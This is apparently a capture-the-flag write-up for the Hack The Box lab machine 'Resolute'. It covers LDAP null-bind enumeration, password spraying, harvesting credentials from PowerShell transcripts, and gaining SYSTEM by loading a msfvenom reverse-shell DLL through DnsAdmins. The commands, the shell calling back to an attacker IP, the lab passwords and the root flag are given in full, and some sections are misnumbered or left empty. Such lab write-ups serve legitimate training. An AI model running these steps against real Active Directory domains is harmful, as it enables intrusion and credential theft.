# HTB Resolute

> **Platform:** Hack The Box
> **OS:** Windows Server 2016 (Active Directory)
> **Domain:** `megabank.local` — host `RESOLUTE`
> **Difficulty:** Medium

## Attack Path Overview

1. **Recon** – DC; LDAP allows a null bind.
2. **LDAP description** – `marko`'s description leaks an initial password `Welcome123!`.
3. **Password spray** – that password is actually valid for **`melanie`** (not marko).
4. **PowerShell transcript** – as `melanie`, a leftover PS transcript records `ryan`'s password `Serv3r4Admin4cc123!`.
5. **DnsAdmins → SYSTEM** – `ryan` is in **DnsAdmins**; load a malicious DLL into the DNS service → SYSTEM → root.

## 2. Null LDAP → password in a description

```bash
netexec smb 10.129.96.155 -u '' -p '' --rid-brute      # (all sidtypeuser entries are users)
netexec ldap 10.129.96.155 -u '' -p '' --users
```

Among 27 users, `marko`'s description leaks an initial password:

## 3. Password Spray → `melanie`

Spray the one password across every user (the password doesn't belong to marko):

```bash
nxc smb 10.129.96.155 -d megabank.local -u users2.txt -p 'Welcome123!' --continue-on-success
```

> ⚠️ The log ran this with `-d cicada.htb` (a left-over domain label) — cosmetic only; the hit is real. Use `-d megabank.local`.

```
SMB  10.129.96.155  445  RESOLUTE  [+] megabank.local\melanie:Welcome123! 
```

```bash

## 4. PowerShell Transcript → `ryan`

A forgotten PowerShell transcript on disk records a `net use` command with `ryan`'s cleartext password:

```powershell
cat C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

```
Username: MEGABANK\ryan
...
value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

> A quick way to find such leaks:
> ```powershell
> Get-ChildItem C:\ -Recurse -File -Force -ErrorAction SilentlyContinue |
>   Where-Object { $_.FullName -match 'transcript|history|ConsoleHost_history' } |
>   Select-String -Pattern 'password|passwd|pwd|credential|net use|ConvertTo-SecureString' -ErrorAction SilentlyContinue
> ```

```
ryan : Serv3r4Admin4cc123!
```

## 6. DnsAdmins → SYSTEM

Build a reverse-shell DLL and host it over SMB:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.63 LPORT=443 -f dll -o rev.dll
sudo impacket-smbserver share .
nc -lvnp 443
```

On the target, point the DNS service at the DLL and bounce the service:

```cmd
dnscmd.exe /config /serverlevelplugindll \\10.10.14.63\share\rev.dll
sc.exe \\127.0.0.1 stop dns
sc.exe query dns          :: confirm STOPPED
sc.exe \\127.0.0.1 start dns
sc.exe query dns          :: confirm RUNNING
```

The DNS service loads the DLL and a SYSTEM reverse shell lands on the listener:

```
C:\Users\Administrator\Desktop>type root.txt
4c170297996d8fee1fb720fff2824486
```

```
root.txt : 4c170297996d8fee1fb720fff2824486
```

## Credential Summary

| Account   | Secret                 | How obtained                        |
| --------- | ---------------------- | ----------------------------------- |
| `melanie` | `Welcome123!`          | LDAP description (marko) + spray    |
| `ryan`    | `Serv3r4Admin4cc123!`  | PowerShell transcript (`net use`)   |
| SYSTEM    | (DnsAdmins DLL)        | DNS `serverlevelplugindll` abuse    |

## Lessons Learned

- **A password in one user's description may belong to another** — spray it across the whole list rather than assuming.
- **PowerShell transcripts / console history** (`C:\PSTranscripts`, `ConsoleHost_history.txt`) are a rich source of leaked credentials.
- **DnsAdmins ≈ SYSTEM on a DC**: members can register a `serverlevelplugindll`; restarting the DNS service loads your DLL with SYSTEM privileges.
- Match your `-d` domain to the target — a stray value only mislabels output here, but can break real auth.
